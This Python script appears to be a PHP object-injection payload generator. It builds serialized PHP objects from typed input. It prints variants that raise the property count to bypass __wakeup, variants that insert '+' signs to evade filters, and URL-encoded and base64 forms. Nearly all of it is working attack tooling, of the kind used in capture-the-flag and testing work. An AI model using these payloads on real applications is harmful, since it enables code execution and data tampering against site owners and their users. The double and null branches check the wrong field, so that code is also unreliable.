import re
import base64

def main():
    '''
        [+] Github: https://github.com/X3NNY/PHPUnserializeTool
        [+] Author: Xenny
    '''
    name = input("Input PHP class name:").strip()
    num = int(input("Input class variables numbers:").strip())

    arr = []
    for i in range(num):
        s = input("Input %d var([[role|]type|]name|value):" % (i+1)).strip().split('|')
        if len(s) == 2:
            arr.append(('d','s',s[0],s[1]))
        elif len(s) == 3:
            arr.append(('d',s[0].lower(),s[1],s[2]))
        else:
            arr.append((s[0].lower(),s[1][0].lower(),s[2],s[3]))

    payload = 'O:+%d:"%s":+%d:{' % (len(name),name,num)

    for i in arr:
        if i[0].startswith('d'):
            tmp = "s:+%d:\"%s\";" % (len(i[2]),i[2])
        elif i[0].startswith('pro'):
            tmp = "s:+%d:\"\x00*\x00%s\";" % (len(i[2])+3,i[2])
        elif i[0].startswith('pri'):
            tmp = "s:+%d:\"\x00%s\x00%s\";" % (len(i[2])+2+len(name),name,i[2])
        
        if i[1] == 's':
            tmp += "s:+%d:\"%s\";" % (len(i[3]),i[3])
        elif i[1] == 'i':
            tmp += "i:+%s;" % i[3]
        elif i[2] == 'd':
            tmp += "d:+%s;" % i[3]
        elif i[2].startswith("n"):
            tmp += "N;"

        payload += tmp

    payload += '}'

    pat = re.compile(r'\d+(?=:{)')
    print("unserialize =", str(bytes(payload.replace('+',''),encoding='utf-8'))[2:-1])
    payload = re.sub(pat,str(num+1),str(payload))
    print("payload(origin) =", str(bytes(payload.replace('+',''),encoding='utf-8'))[2:-1])
    print("payload(url) =", str(bytes(payload.replace('+',''),encoding='utf-8')).replace("\\x",'%')[2:-1])
    print("payload(x1) =",str(bytes(payload,encoding='utf-8'))[2:-1])
    print("payload(base64) =", str(base64.b64encode(bytes(payload.replace('+',''),encoding='utf-8')))[2:-1])
    print("payload(x1|base64) =", str(base64.b64encode(bytes(payload,encoding='utf-8')))[2:-1])

if __name__ == '__main__':
    main()
    